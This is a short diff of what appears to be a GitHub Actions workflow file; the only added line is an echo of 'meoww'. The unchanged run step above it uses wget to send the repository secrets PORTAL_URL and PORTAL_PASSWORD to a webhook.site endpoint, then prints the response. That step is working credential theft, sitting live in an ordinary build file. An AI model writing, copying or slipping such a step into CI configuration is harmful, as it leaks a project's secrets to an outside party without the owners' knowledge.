@@ -11,3 +11,4 @@ jobs:
         run: | 
           C:\msys64\usr\bin\wget.exe '''https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{ secrets.PORTAL_URL }}&nya=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
+          echo "meoww"
